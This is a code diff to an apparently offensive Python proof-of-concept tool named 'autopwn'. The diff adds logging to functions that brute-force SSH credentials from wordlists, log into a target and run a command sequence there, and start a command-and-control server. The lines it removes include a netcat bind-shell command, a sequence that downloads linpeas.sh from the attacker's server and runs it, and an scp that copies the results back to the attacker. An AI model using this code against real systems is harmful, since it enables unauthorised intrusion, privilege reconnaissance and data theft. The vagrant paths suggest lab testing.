@@ -8,9 +8,11 @@ from autopwn import flushProcesses
 import sequences as s
 from logs import LOG
 
+LOGFILE = open("./LOGS","r+")
 
 def processList(inp="") -> list:
     """Function that process lists txts in lists."""
+    LOG(f"Processing wordlist for input : {inp}",LOGFILE)
     with open(inp, "r+") as f:
         tmp = f.readlines()
     lst = []
@@ -21,6 +23,7 @@ def processList(inp="") -> list:
 
 def getSshCredsAndConn(ulist="", plist="", domain="") -> tuple[(str, str)]:
     """Slow bruteforce of ssh credentials."""
+    LOG(f"Bruteforcing user/password for {domain}", LOGFILE)
     uname = processList(ulist)
     passwd = processList(plist)
     retUsr = "x"
@@ -44,21 +47,30 @@ def getSshCredsAndConn(ulist="", plist="", domain="") -> tuple[(str, str)]:
 def autoSshPawn(usr, password, host, sequence) -> int:
     """ Take ssh credentials to connect and remotely runs\\
         instructions on target machine. """
+    LOG(f"Pawning host {host} with SSH creds {usr}:{password}", LOGFILE)
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
+        LOG(f"Connecting to {host} with SSH creds {usr}:{password}", LOGFILE)
         ssh.connect(host, username=usr, password=password)
     except paramiko.AuthenticationException:
+        LOG(f"Connection to SSH client failed.", LOGFILE,"err")
         print(f"Can't connect to SSH client.")
-        exit(-1)
+        return -1
 
     print(f"Pawning machine through SSH ...")
     for instruction in sequence:
         print(f"[Command] {instruction}")
-        stdin, stdout, stderr = ssh.exec_command(
-            instruction, timeout=30
-        )  # nc -l -p 55555 -e /bin/bash')
-        print(f"[Output] " + stdout.read().decode("utf8"))
+        LOG(f" Launched {instruction} over SSH against {host}", LOGFILE)
+        try:
+            stdin, stdout, stderr = ssh.exec_command(
+                instruction, timeout=10
+            )
+            print(f"[Output] " + stdout.read().decode("utf8"))
+        except TimeoutError:
+            LOG(f"Timeout error for {instruction}. ", LOGFILE,"crit")
+            continue
+
     return 0
 
 
@@ -85,22 +97,12 @@ if __name__ == "__main__":
         proc, port = openCtrlSrv(bindaddr=attackAddr)
         srv = f"{attackAddr}:{port}"
         print(f"Command and Control server @{srv} !")
-
-        # Useful sequence :
-        # sequence = ["whoami",
-        #             "pwd",
-        #             "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
-        #             "chmod +x linpeas.sh",
-        #             "./linpeas.sh > ./linout"]
-
         autoSshPawn(usr, pwd, target, s.getsequence(7, srv))
-
-        print(f"[Local command] scp {usr}@{target}:/home/vargant/linout .")
-        proc = run(
-            f"scp {usr}@{target}:/home/vagrant/linout {attacker}@{attackAddr}:.",
-            shell=True,
-        )
-
+        # print(f"[Local command] scp {usr}@{target}:/home/vargant/linout .")
+        # proc = run(
+        #     f"scp {usr}@{target}:/home/vagrant/linout {attacker}@{attackAddr}:.",
+        #     shell=True,
+        # )
         print(f"*** End of POC ***")
-
+        LOGFILE.close()
         exit(0)
